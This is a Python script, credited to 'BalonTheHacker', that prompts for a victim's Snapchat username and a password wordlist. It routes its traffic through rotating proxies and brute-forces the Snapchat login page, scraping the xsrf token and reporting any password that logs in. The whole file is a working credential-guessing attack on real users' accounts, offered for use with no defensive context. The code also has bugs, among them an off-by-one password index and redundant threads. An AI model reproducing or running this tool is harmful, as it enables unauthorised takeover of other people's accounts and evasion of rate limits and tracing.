import sys
import os
import requests
import random
import time
from itertools import cycle
import threading
from queue import Queue
import time
from lxml import html
# pip install requests[socks]
# brew install tor

name_of_file = sys.argv[0]
working_proxies = []

print("""

  _____ ____    ____  ____  _____   ___   ____       __    ___
 / ___/|    \  /    ||    \|     | /   \ |    \    /    ] /  _]
(   \_ |  _  ||  o  ||  o  )   __||     ||  D  )  /    / /  [_
 \__  ||  |  ||     ||   _/|  |_  |  O  ||    /  |    /  |    _]
 /  \ ||  |  ||  _  ||  |  |   _] |     ||    \  |    \_ |   [_
 \    ||  |  ||  |  ||  |  |  |   |     ||  .  \ \     | |     |
  \___||__|__||__|__||__|  |__|    \___/ |__|\_|  \____| |_____|

by BalonTheHacker
""")


##User input

snap_name = input("What is the victims snapchat username? ")
password_list = input("What is the path to the password list? ")
try:
    password_list = open(password_list).readlines()
except:
    print("path invalid")
    quit()
number_of_threads = input("How many threads would you like to run? (Recommended 10): ")

dir_path = os.path.dirname(os.path.realpath(__file__))
#Connecting to a proxy with urllib3
print("Finding Working Proxies")
proxy_list = open(dir_path + "/proxies.txt", 'r+').readlines()
proxy_list = [item.replace("""\n""", "") for item in proxy_list]
proxy_pool = cycle(proxy_list)

url = "https://httpbin.org/ip"
for i in range(len(proxy_list)-1):
    #Get a proxy from the pool
    proxy = next(proxy_pool)
    try:
        response = requests.get(url,proxies={"http": proxy, "https": proxy})
        working_proxies.append(proxy)
        break
    except:
        pass;
print("Found working proxy")
lenght_of_proxy = len(working_proxies)

number_of_proxy_rand = random.randint(0,int(lenght_of_proxy-1))
print("Connecting to proxy (Might take a while)")
number_of_proxy_rand = number_of_proxy_rand
proxies = {
    'http':  working_proxies[number_of_proxy_rand],
    'https': working_proxies[number_of_proxy_rand],
}

os.environ['http_proxy'] = working_proxies[number_of_proxy_rand]
os.environ['HTTP_PROXY'] = working_proxies[number_of_proxy_rand]
os.environ['https_proxy'] = working_proxies[number_of_proxy_rand]
os.environ['HTTPS_PROXY'] = working_proxies[number_of_proxy_rand]

# Create the session and set the proxies.
l = requests.Session()
l.proxies = proxies

print("Checking Connection")
r = l.get("https://httpbin.org/ip")
print("your connecting through: ", r.text)


print("ATTEMPTING BRUTEFORCE")


login_lock = threading.Lock()
def threader():
    while True:
        worker = q.get()
        bruting(worker)
        q.task_done()

def bruting(worker):
    time.sleep(0.5)
    with login_lock:
        for i in range(len(password_list)):
            login_url = "https://accounts.snapchat.com/accounts/login/"
            result = l.get(login_url)

            tree = html.fromstring(result.content)
            authenticity_token = tree.xpath("//input[@name='xsrf_token']/@value")

            payload = {
                "username" : snap_name,
                "password" : password_list[i-1],
                "xsrf_token" : authenticity_token
            }

            result = l.post(
                login_url,
            	data = payload,
            	headers = dict(referer=login_url)
            )
            if result.url == "https://accounts.snapchat.com/accounts/login" :
                pass
            else:
                print("password found, password is:", password_list[i-1])
                quit()


q = Queue()

for x in range(int(number_of_threads)) :
    t = threading.Thread(target = threader)
    t.daemon = True
    t.start()

start = time.time()

for worker in range(len(password_list)) :
    q.put(worker)
q.join()



print("Nothing found!")
quit()
